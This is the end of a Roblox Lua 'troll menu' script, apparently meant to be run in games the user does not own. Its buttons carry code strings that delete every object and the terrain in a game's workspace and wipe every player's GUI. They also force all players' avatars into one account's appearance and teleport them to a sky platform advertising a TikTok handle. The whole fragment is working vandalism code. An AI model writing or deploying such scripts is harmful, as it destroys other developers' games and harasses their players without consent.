    addMenuButton("MAP by hoangtt.03", 'local p=game:GetService("Players") local w=game:GetService("Workspace") local id=p:GetUserIdFromNameAsync("eroi12345ll") for _,v in pairs(w:GetChildren()) do if v.Name~="Terrain" and not p:GetPlayerFromCharacter(v) then v:Destroy() end end w.Terrain:Clear() local m=Instance.new("Part",w) m.Name="TeleBase" m.Size=Vector3.new(150,1,150) m.CFrame=CFrame.new(0,1000,0) m.Anchored=true m.Color=Color3.fromRGB(48,0,72) m.Material=Enum.Material.Neon local s=Instance.new("Part",w) s.Size=Vector3.new(30,10,1) s.CFrame=m.CFrame*CFrame.new(0,10,60) s.Anchored=true s.Color=Color3.new(1,1,1) local g=Instance.new("SurfaceGui",s) g.Face="Front" local t=Instance.new("TextLabel",g) t.Size=UDim2.new(1,0,1,0) t.BackgroundTransparency=1 t.Text="Tiktok hoangtt.03" t.TextColor3=Color3.new(0,0,0) t.TextScaled=true local function apply(v) spawn(function() local desc=p:GetHumanoidDescriptionFromUserId(id) if v.Character and v.Character:FindFirstChild("Humanoid") then v.Character.Humanoid:ApplyDescription(desc) v.Character:MoveTo(m.Position+Vector3.new(math.random(-20,20),5,math.random(-20,20))) end end) end for _,v in pairs(p:GetPlayers()) do apply(v) v.CharacterAdded:Connect(function() task.wait(0.5) apply(v) end) end p.PlayerAdded:Connect(function(v) v.CharacterAdded:Connect(function() task.wait(0.5) apply(v) end) end)')
    addMenuButton("CLEAN MAP", 'for _, v in pairs(workspace:GetChildren()) do if not v:IsA("Camera") and not v:IsA("Terrain") and not v:FindFirstChild("Humanoid") then v:Destroy() end end; for _, p in pairs(game.Players:GetPlayers()) do if p.PlayerGui then p.PlayerGui:ClearAllChildren() end end')
    addMenuButton("CLOSE GUI", function() screenGui:Destroy() end)
end

showTrollMenu()